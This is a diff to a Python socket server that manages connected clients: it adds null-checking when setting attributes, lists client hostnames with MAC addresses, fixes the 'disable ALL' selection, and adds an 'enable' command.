@@ -101,15 +101,18 @@ def set_client_attribute(*attributes):
 	d_print('target ' + target_attribute[0])
 	client = client_select(selection_attribute[0], 
 							selection_attribute[1]) # get the client object
-								
-	client.set_attributes(target_attribute[0],
-							target_attribute[1])
+	
+	if (client):					
+		client.set_attributes(target_attribute[0],
+								target_attribute[1])
 
-	print('setting %s for client %s to %s' % (
-		target_attribute[0], 
-		client.get_attributes('__hostname'), 
-		target_attribute[1]))
-	return
+		print('setting %s for client %s to %s' % (
+			target_attribute[0], 
+			client.get_attributes('__hostname'), 
+			target_attribute[1]))
+		return
+	else:
+		print("[Warning] The command failed")
 
 		
 def LookForJobs():
@@ -181,22 +184,36 @@ def handle(socket, address):
 					break
 					
 		if line.lower() == 'clients':
-			print('Sending list of clients to interface')
+			print('[<-] Sending list of clients to interface')
 			for client in clients_list:
-				print(client.get_attributes('__hostname'))
-				fileobj.write(str(client) + '\n')
+				list_of_clients = client.get_attributes('__hostname') + " " + str(client.get_attributes('__mac_address'))
+				d_print(list_of_clients)
+				fileobj.write(list_of_clients + '\n')
 			fileobj.flush()
 		
 		elif line.lower().startswith('disable'):
 			command = line.split()
 			if len(command) > 1:
 				if command[1] == 'ALL':
-					set_client_attribute(('__status', 'disabled'), ('__status', 'disabled'))
+					set_client_attribute(('__status', 'enabled'), ('__status', 'disabled'))
 				else:
 					print(command[1])
 					set_client_attribute(('__hostname', command[1]), ('__status', 'disabled'))
 			else:
-				fileobj.write('[Warning] No client selected\n')
+				fileobj.write('[Warning] No client selected. Specify a '
+					'client name or use the \'ALL\' argument.\n')
+
+		elif line.lower().startswith('enable'): # Here we have a lot of code duplication!
+			command = line.split()
+			if len(command) > 1:
+				if command[1] == 'ALL':
+					set_client_attribute(('__status', 'disabled'), ('__status', 'enabled'))
+				else:
+					#print(command[1])
+					set_client_attribute(('__hostname', command[1]), ('__status', 'enabled'))
+			else:
+				fileobj.write('[Warning] No client selected. Specify a '
+					'client name or use the \'ALL\' argument.\n')
 				
 		elif line.lower() == 'test':
 			fileobj.write('test>')
@@ -208,11 +225,11 @@ def handle(socket, address):
 			clients_list[0].send('kill')
 		
 		elif line.lower() == 'quit':
-			print('Closed connection from %s:%s' % address)
+			print('[x] Closed connection from %s:%s' % address)
 			break
 			
 		elif not line:
-			print ('Client disconnected')
+			print ('[x] Client disconnected')
 			break
 		
 		#print("line is " + line)
